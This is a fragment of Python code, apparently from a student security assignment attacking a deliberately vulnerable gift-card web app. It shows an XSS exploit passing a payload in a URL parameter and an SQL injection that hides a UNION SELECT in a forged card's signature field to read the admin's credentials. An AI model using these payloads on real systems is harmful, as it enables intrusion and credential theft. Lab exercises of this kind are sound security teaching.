...
def exploit_xss_vulnerability():
    ...
    response = client.get(f'/buy/3?director={xss_payload}')
...
# didn't know how to write HTML, spent most of time reading the code and understanding it
...
def exploit_sql_injection_vulnerability():
    ...
    """
    sql_payload = "' UNION SELECT id || '-' || username || '-' || password FROM LegacySite_user WHERE username='admin' --"
    fakecard = {"merchant_id": "GPT-4 API Credits",
                "customer_id": "testtest",
                "total_value": "249",
                "records": [{"record_type": "amount_change",
                        "amount_added": 2000,
                        "signature": sql_payload}]}
    fakejson = json.dumps(fakecard).encode('utf-8')
